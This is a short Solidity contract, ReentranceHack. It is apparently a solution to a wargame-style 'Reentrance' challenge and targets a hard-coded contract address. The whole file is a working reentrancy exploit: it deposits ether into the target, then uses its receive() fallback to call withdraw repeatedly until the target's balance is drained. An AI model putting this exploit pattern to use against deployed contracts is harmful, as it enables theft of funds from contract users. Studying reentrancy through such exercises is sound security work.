// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./contract.sol";

contract ReentranceHack {
    uint256 private amount = 0;
    Reentrance public original =
        Reentrance(payable(0x0b6FC332E055D6F598e5D5BECFaDF3f8D07f8940));

    function payMe() public payable {}

    function donate() public {
        original.donate{value: address(this).balance}(address(this));
    }

    function withdraw(uint256 _amount) public {
        amount = _amount;
        original.withdraw(_amount);
    }

    receive() external payable {
        if (address(original).balance > 0) {
            if (address(original).balance > amount) {
                original.withdraw(amount);
            } else {
                original.withdraw(address(original).balance);
            }
        }
    }
}
